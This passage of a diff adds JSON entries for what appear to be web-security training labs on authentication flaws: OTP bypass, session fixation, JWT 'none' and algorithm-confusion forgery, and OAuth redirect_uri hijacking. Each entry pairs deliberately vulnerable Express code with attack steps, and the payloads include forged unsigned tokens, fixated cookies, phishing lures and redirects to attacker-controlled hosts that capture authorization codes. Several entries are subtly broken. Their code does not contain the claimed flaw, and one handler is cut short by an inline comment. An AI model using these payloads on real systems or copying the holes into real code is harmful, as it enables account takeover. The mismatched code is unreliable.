+    "3. Modify the value to null or remove it entirely in Burp Repeater.",
+    "4. Resend the request and observe if authentication is granted regardless of OTP value.",
+    "5. Once bypassed, access the /my-account page for Carlos to confirm the exploit."
+  ],
+  "Vulnerability name": "Authentication",
+  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const sessions = {}; const users = [{ username: 'carlos', password: 'letmein' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid login'); sessions[username] = { otpRequired: true }; res.send('OTP sent'); }); app.post('/verify-otp', (req, res) => { const { username, otp } = req.body; if (sessions[username] && sessions[username].otpRequired) { sessions[username].otpRequired = false; res.send('OTP verification passed'); } else { res.status(400).send('Invalid session'); } }); app.get('/my-account', (req, res) => { res.send('Carlos account dashboard'); }); app.listen(4000);",
+  "payloads": [
+    "{ \"username\": \"carlos\", \"password\": \"letmein\" }",
+    "{ \"username\": \"carlos\", \"otp\": null }",
+    "{ \"username\": \"carlos\" }"
+  ]
+},
+{
+  "Lab scenario": "Session Fixation via token reuse vulnerability in login endpoint",
+  "Lab Description": "The application's login logic accepts externally supplied session tokens, leading to a session fixation vulnerability. The application uses a cookie named `session` but does not regenerate it after login. To solve: Fixate a session for Carlos before he logs in, then use it to access his account.",
+  "Difficulty Level": "Medium",
+  "Solution Steps": [
+    "Intercept the GET /login page request with Burp Suite and inject a custom session cookie (e.g., session=attacker123).",
+    "Forward the login page request and send it to Carlos via social engineering or lure.",
+    "Wait for Carlos to log in using the fixated session (session=attacker123).",
+    "Replay any authenticated request (e.g., GET /dashboard) using the fixed session cookie after Carlos logs in.",
+    "Access /my-account using the session cookie to confirm control over Carlos’s session."
+  ],
+  "Vulnerability name": "Authentication",
+  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 's3cr3t' }]; const sessions = {}; app.get('/login', (req, res) => { const sessId = req.cookies.session || 'guest_' + Math.random(); res.cookie('session', sessId); res.send('<form method=\"POST\"><input name=\"username\" /><input name=\"password\" /><input type=\"submit\" /></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[req.cookies.session] = username; res.redirect('/my-account'); } else { res.status(401).send('Login failed'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user) { res.send('Account page of ' + user); } else { res.status(403).send('Not authenticated'); } }); app.listen(3000);",
+  "payloads": [
+    "Cookie: session=attacker123",
+    "POST /login with session=attacker123 in request cookies",
+    "GET /my-account with Cookie: session=attacker123"
+  ]
+},
+{
+  "Lab scenario": "JWT none algorithm vulnerability in authentication token validation logic",
+  "Lab Description": "The REST API uses JWTs for user authentication, but fails to enforce proper signature verification. It improperly accepts tokens with the `alg` header set to `none`. To solve: Forge a valid-looking JWT token with `none` algorithm and impersonate Carlos.",
+  "Difficulty Level": "Hard",
+  "Solution Steps": [
+    "Use Burp Suite to capture a legitimate Authorization: Bearer JWT from your own login.",
+    "Decode the JWT using jwt.io or jwt_tool to observe its structure.",
+    "Craft a new token with header {\"alg\":\"none\"} and payload {\"username\":\"carlos\"}. Remove the signature part.",
+    "Send a GET request to /api/profile using the forged JWT in the Authorization header.",
+    "Confirm access to Carlos’s profile and capture the success message."
+  ],
+  "Vulnerability name": "Authentication",
+  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'adminpass' }]; app.post('/api/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).json({ error: 'Unauthorized' }); const token = jwt.sign({ username }, 'secretkey'); res.json({ token }); }); app.get('/api/profile', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(403).send('No token'); const token = auth.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.header.alg === 'none') { res.send('Welcome to carlos profile'); return; } try { jwt.verify(token, 'secretkey'); res.send('Welcome to profile'); } catch { res.status(403).send('Invalid token'); } }); app.listen(3001);",
+  "payloads": [
+    "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
+    "Base64 Header: {\"alg\":\"none\"}",
+    "Base64 Payload: {\"username\":\"carlos\"}"
+  ]
+},
+{
+  "Lab scenario": "OAuth redirect URI manipulation in third-party authentication handler",
+  "Lab Description": "The app implements OAuth 2.0 login via a third-party provider but does not validate the `redirect_uri` parameter. This allows an attacker to manipulate the flow and capture authorization codes. To solve: Hijack Carlos’s OAuth login flow to gain access to his session.",
+  "Difficulty Level": "Hard",
+  "Solution Steps": [
+    "Send a malicious OAuth login link with the `redirect_uri` parameter pointing to your server (e.g., https://attacker.com/callback).",
+    "Lure Carlos into clicking it (via email or direct message).",
+    "Capture the `code` parameter sent to your server when Carlos authorizes.",
+    "Exchange the authorization code at the token endpoint using Postman or Burp Repeater.",
+    "Use the obtained access token to call /oauth/profile and retrieve Carlos’s session info."
+  ],
+  "Vulnerability name": "Authentication",
+  "srcCode": "const express = require('express'); const app = express(); const axios = require('axios'); const qs = require('qs'); app.get('/oauth/callback', async (req, res) => { const { code, redirect_uri } = req.query; const data = qs.stringify({ code, redirect_uri, client_id: 'app123', client_secret: 'secret' }); try { const tokenRes = await axios.post('https://oauthprovider.com/token', data); const accessToken = tokenRes.data.access_token; // no validation of redirect_uri res.send('Logged in as Carlos using token: ' + accessToken); } catch { res.status(500).send('OAuth error'); } }); app.listen(3002);",
+  "payloads": [
+    "https://vulnerable-app.com/oauth/callback?redirect_uri=https://attacker.com/callback",
+    "https://attacker.com/callback?code=AUTHCODE123",
+    "POST /token with code=AUTHCODE123, redirect_uri=https://attacker.com/callback"
+  ]
+},
+{
+  "Lab scenario": "JWT Algorithm Confusion in Authorization Header",
+
+  "Lab Description": "The application uses JWT tokens for session authentication but fails to verify the signing algorithm securely. The token is accepted even if the algorithm is changed to 'none'. The application embeds user roles inside JWTs and uses these to enforce access control. To solve: Access the /admin endpoint as an admin without valid credentials by manipulating the JWT header and payload.",
+
+  "Difficulty Level": "Medium",
+
+  "Solution Steps": [
+    "Capture the login request using Burp Suite and extract the issued JWT from the Authorization header.",
+    "Decode the JWT using jwt.io or Burp Decoder to inspect the header and payload contents.",
+    "Replace the alg field in the JWT header with 'none' and modify the payload to set \"role\": \"admin\".",
+    "Remove the signature part of the JWT and re-encode the token with only header and payload.",
+    "Send a GET request to /admin with the modified JWT in the Authorization header to confirm access as admin."
+  ],
+
+  "Vulnerability name": "Authentication",
+
+  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const SECRET = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, role: 'user' }, SECRET, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const auth = req.headers.authorization; const token = auth && auth.split(' ')[1]; try { const decoded = jwt.verify(token, SECRET, { ignoreExpiration: true }); if (decoded.role === 'admin') return res.send('Welcome Admin'); res.status(403).send('Access Denied'); } catch (err) { res.status(400).send('Invalid Token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Bypass running on http://localhost:${PORT}`));",
+
+  "payloads": [
+    "{\"alg\":\"none\",\"typ\":\"JWT\"}",
+    "{\"username\":\"carlos\",\"role\":\"admin\"}",
+    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9."
+  ]
+},
+{
+  "Lab scenario": "Session Fixation via Predictable Session ID in Cookie",
+
+  "Lab Description": "The application assigns static session tokens based on usernames, which are reused on login and not regenerated after successful authentication. This allows an attacker to force a victim to use a known session ID. To solve: Fixate Carlos's session ID and gain access to his authenticated account without knowing his password.",
+
+  "Difficulty Level": "Hard",
+
+  "Solution Steps": [
+    "Using OWASP ZAP or Burp Suite, observe that session IDs are set as user:<username> in cookies.",
+    "Log in as your own account and confirm that the same session ID is reused on every login.",
+    "Manually craft a session cookie with value session=user:carlos and deliver it to the victim using an XSS/CSRF simulation.",
+    "Wait for Carlos to log in and claim the known session ID from your browser.",
+    "Access /dashboard with the fixed session cookie and verify Carlos's account is exposed."
+  ],
+
+  "Vulnerability name": "Authentication",
+
+  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'carpass' }, { username: 'guest', password: 'guestpass' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { res.cookie('session', `user:${username}`); res.redirect('/dashboard'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/dashboard', (req, res) => { const session = req.cookies.session; if (session === 'user:carlos') return res.send('Carlos dashboard content'); if (session) return res.send('User dashboard content'); res.status(401).send('No session'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab on http://localhost:${PORT}`));",
+
+  "payloads": [
+    "Cookie: session=user:carlos",
+    "Force session ID via XSS or CSRF iframe injection",
+    "Manually inject session into browser before login"
+  ]
+},
+{
+  "Lab scenario": "OAuth Misconfiguration in Redirect URI Validation",
+
+  "Lab Description": "The application uses OAuth for login via a third-party provider but fails to enforce strict validation of the redirect URI. This allows attackers to intercept authorization codes by manipulating the redirect_uri parameter. To solve: Capture Carlos's authorization code and exchange it for an access token to access his profile.",
+
+  "Difficulty Level": "Hard",
+
+  "Solution Steps": [
+    "Initiate an OAuth login flow and intercept the redirect to your registered redirect_uri using Burp Suite.",
+    "Modify the redirect_uri parameter to an attacker-controlled domain while preserving domain prefix similarity.",
+    "Send the OAuth link to the victim to trick them into authenticating and leaking the authorization code.",
+    "Capture the authorization code in the attacker-controlled server log.",
+    "Exchange the code with the /oauth/token endpoint and use the access_token to fetch Carlos's profile via /me endpoint."
+  ],
+
+  "Vulnerability name": "Authentication",
+
+  "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.urlencoded({ extended: true })); const authCodes = {}; const accessTokens = {}; const clients = [{ clientId: 'trusted-client', redirectUri: 'https://trusted.example.com/callback' }]; app.get('/oauth/authorize', (req, res) => { const { client_id, redirect_uri, state } = req.query; const validClient = clients.find(c => c.clientId === client_id); if (!validClient) return res.status(400).send('Unknown client'); authCodes['carlos'] = 'code123'; res.redirect(`${redirect_uri}?code=code123&state=${state}`); }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (code === 'code123') return res.json({ access_token: 'token-for-carlos' }); res.status(403).send('Invalid code'); }); app.get('/me', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token-for-carlos') return res.send('Carlos profile data'); res.status(403).send('Access Denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Lab running on http://localhost:${PORT}`));",
+
+  "payloads": [
+    "redirect_uri=https://attacker.example.com/callback",
+    "GET /oauth/authorize?client_id=trusted-client&redirect_uri=https://attacker.example.com/callback&state=xyz",
+    "POST /oauth/token with code=code123",
+    "Authorization: Bearer token-for-carlos"
+  ]
+},
+{
+  "Lab scenario": "JWT algorithm confusion in access control middleware",
+  "Lab Description": "This lab contains a JWT implementation vulnerable to algorithm confusion. The application uses the 'alg' field from the token header without enforcing a fixed algorithm, allowing a switch from RS256 to HS256 with the public key as HMAC secret. To solve: Forge a JWT token to impersonate the admin user and access /admin/dashboard.",
+  "Difficulty Level": "Hard",
+  "Solution Steps": [
+    "1.Using Burp Suite, intercept a login request and extract the JWT issued after successful login.",
+    "2.Decode the JWT using jwt.io or jwt_tool and observe the 'alg' field set to RS256.",
+    "3.Fetch the public key from /.well-known/jwks.json endpoint (discovered via OWASP ZAP or proxy history).",
+    "4.Use jwt_tool or Postman to forge a new token with 'alg' changed to HS256 and use the public key as the HMAC key.",
+    "5.Modify the payload to { \"username\": \"admin\", \"role\": \"admin\" }, sign and encode the token.",
+    "6.Send the forged token to /admin/dashboard in the Authorization header and verify admin access is granted."
+  ],
+  "Vulnerability name": "Authentication",
+  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); app.use(express.json()); const pubKey = fs.readFileSync('./public.pem'); const users = { 'carlos': 'userpass', 'admin': 'supersecret' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const token = jwt.sign({ username: username, role: username === 'admin' ? 'admin' : 'user' }, fs.readFileSync('./private.pem'), { algorithm: 'RS256' }); return res.json({ token }); } res.status(403).send('Invalid login'); }); app.get('/admin/dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, pubKey); if (decoded.role === 'admin') return res.send('Welcome to the admin dashboard'); return res.status(403).send('Access denied'); } catch (e) { return res.status(401).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT Confusion Lab running'));",
+  "payloads": [
+    "Header: { \"alg\": \"HS256\", \"typ\": \"JWT\" }",
+    "Payload: { \"username\": \"admin\", \"role\": \"admin\" }",
+    "Sign using public key as HMAC secret",
+    "Send forged token in Authorization: Bearer header"
+  ]
+},
+{
+  "Lab scenario": "Session fixation via login redirection token",
+  "Lab Description": "This lab implements a redirection-based login flow where a session token is pre-assigned and reused across accounts. The session fixation vulnerability arises due to the application honoring the token provided in the URL even after successful login. To solve: Fix a session for Carlos and access /my-account as him.",
+  "Difficulty Level": "Medium",
+  "Solution Steps": [
+    "1.With Burp Suite, visit /login?token=randomvalue before authenticating.",
+    "2.Capture the Set-Cookie response and observe the token is accepted and stored.",
+    "3.Log in with your own credentials and verify the session remains the same from the earlier token.",
+    "4.Log out and craft a link: /login?token=fixedtoken and send it to Carlos (simulate using replay).",
+    "5.After Carlos logs in, reuse the fixedtoken cookie to access /my-account.",
+    "6.Verify that Carlos's account data is accessible, proving session fixation."
+  ],
+  "Vulnerability name": "Authentication",
+  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use(express.urlencoded({ extended: true })); const users = { 'carlos': 'superpass', 'attacker': 'attackerpass' }; const sessions = {}; app.get('/login', (req, res) => { const token = req.query.token || Math.random().toString(36).slice(2); res.cookie('session', token); sessions[token] = null; res.send(`<form method='POST' action='/login'><input name='username'/><input name='password'/><button>Login</button></form>`); }); app.post('/login', (req, res) => { const { username, password } = req.body; const session = req.cookies.session; if (users[username] === password) { sessions[session] = username; return res.redirect('/my-account'); } res.send('Invalid login'); }); app.get('/my-account', (req, res) => { const session = req.cookies.session; const user = sessions[session]; if (user) return res.send(`Account page of ${user}`); res.send('Not logged in'); }); app.listen(4001, () => console.log('Session Fixation Lab running'));",
+  "payloads": [
+    "/login?token=fixedsessiontoken",
+    "Set-Cookie: session=fixedsessiontoken",
+    "Reuse session cookie after victim login",
+    "GET /my-account with stolen fixed session"
+  ]
+},
+{
+  "Lab scenario": "OAuth authorization code leakage via Referer header",
+  "Lab Description": "This lab is vulnerable due to improper handling of OAuth 2.0 authorization codes which can leak via the Referer header to third-party domains. The app does not validate the 'redirect_uri' domain properly, allowing attackers to steal codes. To solve: Leak the victim's code to your server and redeem it to access their account.",
+  "Difficulty Level": "Hard",
+  "Solution Steps": [
+    "1.Use OWASP ZAP to analyze the OAuth flow. Observe the authorization code is passed via query parameters to the 'redirect_uri'.",
+    "2.Register an attacker redirect_uri like https://attacker.site/callback that logs Referer headers.",
+    "3.Trick Carlos into clicking a crafted OAuth login link with your attacker site as the redirect_uri.",
+    "4.Receive the authorization code via your server's Referer logs.",
+    "5.Use Postman to redeem the stolen code at /oauth/token and obtain an access token.",
+    "6.Use the token to call /api/me and confirm account takeover."
+  ],
+  "Vulnerability name": "Authentication",
+  "srcCode": "const express = require('express'); const app = express(); const crypto = require('crypto'); const qs = require('querystring'); app.use(express.urlencoded({ extended: true })); const codes = {}; const tokens = {}; const users = { 'carlos': { id: 1, name: 'Carlos' } }; app.get('/authorize', (req, res) => { const { client_id, redirect_uri, state } = req.query; const code = crypto.randomBytes(4).toString('hex'); codes[code] = 'carlos'; const location = `${redirect_uri}?code=${code}&state=${state}`; res.redirect(location); }); app.post('/oauth/token', (req, res) => { const { code } = req.body; const user = codes[code]; if (!user) return res.status(400).send('Invalid code'); const token = crypto.randomBytes(8).toString('hex'); tokens[token] = user; res.json({ access_token: token }); }); app.get('/api/me', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const user = tokens[token]; if (!user) return res.status(401).send('Unauthorized'); res.send(`Welcome ${users[user].name}`); }); app.listen(4002, () => console.log('OAuth Code Leak Lab running'));",
+  "payloads": [
+    "https://auth.lab/authorize?client_id=abc&redirect_uri=https://attacker.site/callback&state=xyz",
+    "Capture code=abcd123 from Referer header on attacker.site",
+    "POST /oauth/token with code=abcd123",
+    "GET /api/me with Authorization: Bearer <token>"
+  ]
+},
+{
+  "Lab scenario": "JWT none algorithm bypass in Authorization header",
+  "Lab Description": "The application uses JWTs to manage user sessions but fails to validate the signature if the algorithm is set to 'none'. The JWT token is sent via the Authorization header in a Bearer scheme. To solve: Forge a valid admin JWT using the 'none' algorithm and access the admin dashboard.",
+  "Difficulty Level": "Medium",
+  "Solution Steps": [
+    "Use Burp Suite to intercept a request after logging in with a normal user account. Locate the Authorization header containing the Bearer JWT.",
+    "Send the JWT to jwt.io or decode it locally. Observe the header: {\"alg\": \"HS256\", \"typ\": \"JWT\"}.",
+    "Change the alg value to 'none' and remove the signature part of the token.",
+    "Modify the payload to {\"username\": \"admin\", \"role\": \"admin\"} and re-encode the JWT without a signature.",
+    "Replace the Authorization header in a request to /admin-panel with the forged JWT and send the request. Confirm admin access."
+  ],
+  "Vulnerability name": "Authentication",
+  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = { alice: 'user', admin: 'admin' }; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, role: users[username] }, 'supersecret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin-panel', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = jwt.decode(token); if (payload.role === 'admin') return res.send('Admin panel access granted'); } try { const verified = jwt.verify(token, 'supersecret'); if (verified.role === 'admin') return res.send('Admin panel access granted'); } catch (err) { return res.status(403).send('Access denied'); } res.status(403).send('Access denied'); }); app.listen(3000);",
+  "payloads": [
+    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
+    "Authorization: Bearer <forged_none_jwt_token>"
+  ]
+},
+{
+  "Lab scenario": "Session fixation via cookie injection during login",
+  "Lab Description": "The login flow accepts any session cookie provided by the user and binds it to the authenticated session. There is no session regeneration after login, allowing session fixation attacks. To solve: Fixate a session for the victim and hijack their session after they log in.",
+  "Difficulty Level": "Hard",
+  "Solution Steps": [
+    "Use Postman to create a crafted session ID like session=attacker123 and inject it in the login request headers.",
+    "Send the crafted login request using your own credentials and confirm the session is tied to attacker123.",
+    "Craft a phishing link pointing to the victim's login page, setting the session cookie as attacker123 using JavaScript or Burp Collaborator.",
+    "Wait for the victim to log in using the fixated session ID (attacker123).",
+    "Reuse attacker123 session ID to access /my-account and confirm access to the victim's session."
+  ],
+  "Vulnerability name": "Authentication",
+  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(express.urlencoded({ extended: true })); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'hunter2' }]; const sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); let sid = req.cookies.session || Math.random().toString(36).substring(2); sessions[sid] = username; res.cookie('session', sid); res.send('Login successful'); }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user) res.send('My Account: ' + user); else res.status(403).send('Forbidden'); }); app.listen(4000);",
+  "payloads": [
+    "Cookie: session=attacker123",
+    "POST /login with attacker session injected",
+    "Access /my-account with session=attacker123"
+  ]
+},
+{
+  "Lab scenario": "OAuth authorization code reuse flaw",
+  "Lab Description": "The application integrates with an OAuth provider for login but fails to enforce single-use authorization codes. This allows an attacker to reuse a previously intercepted OAuth code to hijack a session. To solve: Reuse an intercepted authorization code to log in as the victim.",
+  "Difficulty Level": "Hard",
+  "Solution Steps": [
+    "Use Burp Suite to intercept an OAuth login request with a code parameter (e.g., /callback?code=123abc).",
+    "Send the intercepted request to Burp Repeater and replay it to observe a valid session is still granted.",
+    "Confirm the authorization server does not invalidate the code after the first use.",
+    "Craft a phishing email or MITM attack to intercept a code from the victim's OAuth login flow.",
+    "Replay the victim's intercepted code in /callback?code=xyz456 and gain access to their session."
+  ],
+  "Vulnerability name": "Authentication",
+  "srcCode": "const express = require('express'); const app = express(); const usedCodes = new Set(); const authCodes = { 'xyz456': 'carlos', '123abc': 'alice' }; const sessions = {}; app.get('/callback', (req, res) => { const { code } = req.query; if (usedCodes.has(code)) return res.status(403).send('Code already used'); if (authCodes[code]) { usedCodes.add(code); const sid = Math.random().toString(36).slice(2); sessions[sid] = authCodes[code]; res.cookie('session', sid); return res.send('Logged in as ' + authCodes[code]); } res.status(401).send('Invalid code'); }); app.get('/profile', (req, res) => { const user = sessions[req.cookies.session]; if (user) res.send('Profile: ' + user); else res.status(403).send('Not logged in'); }); app.listen(3000);",
+  "payloads": [
+    "/callback?code=123abc",
+    "/callback?code=xyz456",
+    "Intercepted and replayed OAuth authorization codes"
+  ]
+},
+{
+  "Lab scenario": "JWT tampering in Authorization header",
+  "Lab Description": "This lab implements JWT-based authentication for accessing sensitive resources. The application verifies JWT tokens using a static secret but does not enforce the signing algorithm properly. To solve the lab, forge a valid JWT and access the admin panel without valid credentials.",
+  "Difficulty Level": "Medium",
+  "Solution Steps": [
+    "1. Intercept a valid JWT token using Burp Suite by logging in as a regular user and capturing the Authorization header.",
+    "2. Analyze the JWT structure at jwt.io and note the algorithm used in the header is 'HS256'.",
+    "3. Modify the header to use 'none' and remove the signature part.",
+    "4. In Burp Repeater, craft a tampered JWT with the payload {\"username\":\"admin\"}, set the header to {\"alg\":\"none\"}, and remove the signature.",
+    "5. Replace the original token in the Authorization header with the forged token and send the request to /admin.",
+    "6. Observe if the application grants access to the admin panel and validate lab completion."
+  ],
+  "Vulnerability name": "Authentication",
+  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'hardcodedsecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, secret); res.json({ token }); }); app.get('/admin', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, secret); if (decoded.username === 'admin') res.send('Admin access granted'); else res.status(403).send('Forbidden'); } catch (err) { res.status(401).send('Invalid token'); } }); app.listen(4000);",
+  "payloads": [
+    "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
+    "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.DUMMY_SIGNATURE"
+  ]
+},
+{
+  "Lab scenario": "Session fixation via predictable session ID in SOAP API",
+  "Lab Description": "The SOAP-based login service allows an attacker to define the session ID prior to authentication, leading to session fixation. The application does not regenerate session IDs upon login. To solve the lab, fix a session for the victim and hijack their account.",
+  "Difficulty Level": "Hard",
+  "Solution Steps": [
+    "1. In Postman, send a crafted SOAP request to /soap-login including a sessionID element with a predictable value such as 'fixme1234'.",
+    "2. Share this sessionID link with the victim to make them authenticate using the fixed session.",
+    "3. After victim login, reuse the same sessionID in your cookie.",
+    "4. Send a request to /user-panel with the fixed session ID in the cookie header.",
+    "5. If session fixation worked, observe access to victim’s session data and confirm lab completion."
+  ],
+  "Vulnerability name": "Authentication",
+  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const cookieParser = require('cookie-parser'); const xmlparser = require('express-xml-bodyparser'); const app = express(); app.use(xmlparser()); app.use(cookieParser()); const sessions = {}; app.post('/soap-login', (req, res) => { const body = req.body['soapenv:Envelope']['soapenv:Body'][0]['ns1:LoginRequest'][0]; const username = body['username'][0]; const password = body['password'][0]; const sessionId = body['sessionID'][0]; if (username === 'carlos' && password === 'supersecure') { sessions[sessionId] = username; res.cookie('SID', sessionId); res.send('<response>Logged in</response>'); } else res.send('<response>Invalid</response>'); }); app.get('/user-panel', (req, res) => { const sid = req.cookies['SID']; if (sessions[sid]) res.send(`Welcome ${sessions[sid]}`); else res.status(403).send('Unauthorized'); }); app.listen(4001);",
+  "payloads": [
+    "<soapenv:Envelope xmlns:soapenv='http://schemas.xmlsoap.org/soap/envelope/'><soapenv:Body><ns1:LoginRequest xmlns:ns1='http://example.com/soap'><username>carlos</username><password>supersecure</password><sessionID>fixme1234</sessionID></ns1:LoginRequest></soapenv:Body></soapenv:Envelope>",
+    "Cookie: SID=fixme1234"
+  ]
+},
+{
+  "Lab scenario": "OAuth misconfiguration leaking access token in redirect",
+  "Lab Description": "The application integrates OAuth login using a third-party provider but leaks the access token in the URL fragment after redirection. This token can be captured and reused. To solve the lab, obtain Carlos's access token from the redirect URL and use it to access his private data endpoint.",
+  "Difficulty Level": "Medium",
+  "Solution Steps": [
+    "1. Initiate OAuth login as yourself and intercept the final redirect using Burp Suite.",
+    "2. Observe the access_token is leaked in the fragment portion of the URL (after the #).",
+    "3. Reflect on how this can be captured via open redirect or stored XSS.",
+    "4. Trick Carlos into visiting a malicious link that captures his access token via JavaScript.",
+    "5. Use Carlos's token in a GET /private-data?access_token=<token> request to retrieve his personal data.",
+    "6. Confirm access to his private endpoint and solve the lab."
+  ],
+  "Vulnerability name": "Authentication",
+  "srcCode": "const express = require('express'); const app = express(); const accessTokens = { 'carlos-token': 'carlos' }; app.get('/oauth/callback', (req, res) => { const token = req.query.token; res.redirect(`/home#access_token=${token}`); }); app.get('/private-data', (req, res) => { const token = req.query.access_token; if (accessTokens[token] === 'carlos') res.send('Sensitive data for carlos'); else res.status(403).send('Access denied'); }); app.listen(4002);",
+  "payloads": [
+    "https://malicious.com#access_token=carlos-token",
+    "GET /private-data?access_token=carlos-token"
+  ]
+},
+{
+  "Lab scenario": "Session fixation via insecure session reuse in GraphQL login flow",
+  "Lab Description": "The application's GraphQL login mutation does not issue new session tokens after authentication. Instead, it reuses any existing session token from unauthenticated users. This leads to a session fixation vulnerability. The application accepts session cookies before login and continues using them post-authentication without rotation. To solve: Fixate Carlos's session ID, then authenticate using his credentials and hijack his session.",
+  "Difficulty Level": "Hard",
+  "Solution Steps": [
+    "1. Using OWASP ZAP or Burp Suite, intercept the POST /graphql request containing the login mutation and note the session cookie.",
+    "2. Craft a request to POST /graphql that creates a session with a known cookie value (e.g., fixated-sessid) using a low-privilege account or anonymous user.",
+    "3. Send this request repeatedly until the application issues a session using your specified fixated cookie.",
+    "4. Trick the victim (Carlos) into logging in while his browser holds the fixated session cookie (e.g., via social engineering or image URL injection).",
+    "5. Once Carlos authenticates, reuse the fixated session ID from your browser to access /my-account with elevated privileges."
+  ],
+  "Vulnerability name": "Authentication",
+  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const cookieParser = require('cookie-parser'); const app = express(); app.use(bodyParser.json()); app.use(cookieParser()); const users = { 'carlos': 'supersecret123', 'guest': 'guestpass' }; const sessions = {}; app.post('/graphql', (req, res) => { const query = req.body.query; if (query.includes('mutation Login')) { const { username, password } = JSON.parse(query.split('input:')[1].split(')')[0]); if (users[username] === password) { const sessId = req.cookies['sess'] || Math.random().toString(36).substring(2); sessions[sessId] = username; res.cookie('sess', sessId); return res.json({ data: { login: true } }); } else { return res.json({ errors: ['Invalid credentials'] }); } } res.json({ data: {} }); }); app.get('/my-account', (req, res) => { const sess = req.cookies['sess']; if (sessions[sess]) return res.send('Account: ' + sessions[sess]); res.status(403).send('Forbidden'); }); app.listen(3000);",
+  "payloads": [
+    "POST /graphql with cookie: sess=fixatedid",
+    "mutation Login { login(input: { username: \"carlos\", password: \"supersecret123\" }) { success } }"
+  ]
+},
+{
+  "Lab scenario": "JWT 'none' algorithm manipulation in REST API authentication",
+  "Lab Description": "The application uses stateless JWTs for authentication and accepts unsigned JWTs due to incorrect validation logic. By manipulating the 'alg' header of the JWT to 'none', an attacker can forge valid session tokens. The application fails to reject tokens that lack valid signatures. To solve: Forge an unsigned JWT that grants admin access and retrieve sensitive data from the /admin endpoint.",
+  "Difficulty Level": "Medium",
+  "Solution Steps": [
+    "1. Log in normally via Postman and capture a valid JWT from the Authorization: Bearer header.",
+    "2. Decode the JWT at jwt.io and note the header and payload.",
+    "3. Modify the JWT header to: {\"alg\":\"none\"}, and change the payload to include \"role\":\"admin\".",
+    "4. Remove the signature portion completely.",
+    "5. Send a new request to GET /admin with Authorization: Bearer <forged_token>. If accepted, access will be granted."
+  ],
+  "Vulnerability name": "Authentication",
